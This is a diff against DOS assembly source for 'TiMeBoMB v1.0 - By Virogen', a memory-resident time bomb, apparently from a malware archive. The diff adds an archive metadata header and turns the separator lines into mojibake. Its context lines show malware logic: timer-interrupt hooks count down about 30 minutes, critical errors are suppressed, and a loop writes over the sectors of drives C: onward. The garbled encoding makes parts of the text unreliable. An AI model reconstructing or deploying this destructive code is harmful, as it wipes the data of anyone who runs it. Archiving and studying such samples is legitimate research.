@@ -1,7 +1,18 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 ;
-;          дддддддддддддддддддддддддддддддддддддддддддддддддд
+;          О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;                     TiMeBoMB v1.0 - By Virogen
-;          дддддддддддддддддддддддддддддддддддддддддддддддддд
+;          О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;**************************************************************
 ; Warning: The following code can and will destroy data on a
 ;          computer system. DO NOT RUN THIS PROGRAM UNLESS
@@ -43,7 +54,7 @@ segment	cseg
 org	100h
 start_mem:
 jmp	end_mem			; skip to installation
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; New INT 8h (clock tick) handler. This interrupt is called approximatly
 ; 18.2065 times per second.  So, to figure up how many clock ticks will
 ; be needed to activate after a certain amount of seconds, use the following
@@ -64,7 +75,7 @@ new8:
 jump_8:	db	0eah		; jump far to original interrupt 8
 old8_ofs dw	0
 old8_seg dw	0
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; New interrupt 1Ch - timer tick - when this interrupt is called and
 ;  the NOW variable is set to 1, the bomb activates. You can easily hook
 ;  another interrupt here, and wait until a specific system function
@@ -112,7 +123,7 @@ new_drive:
 new_al:	mov	al,2		; drive C:+1=D:
 inc_al:	inc	al		; goto next drive C:-max
 	jmp	drive_loop	; kill next logical drive
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; New critical error handler (INT 24h) - always fails calls. Only
 ;  used at the time of activation. Critical errors will not stop the
 ;  disk kill.
@@ -120,7 +131,7 @@ inc_al:	inc	al		; goto next drive C:-max
 new24:
 	mov	al,2
 	iret
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Data area for resident routines
 ;
 tick_cnt dw    32772            ; ticks to wait before activation (30 mins)
@@ -138,7 +149,7 @@ now	db	0		; signal INT 16h to activate
 max_sec dw      0               ; max number of sectors to write - increments
                                 ; by 1000 per entire loop of drives A:-Z:
 end_mem:                        ; end of memory resident code
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Runtime portion of bomb - installs itself in memory just below the 640k
 ;  conventional memory size will have decresed slightly. The code does
 ;  not prevent the bomb from being loaded multiple times basically because
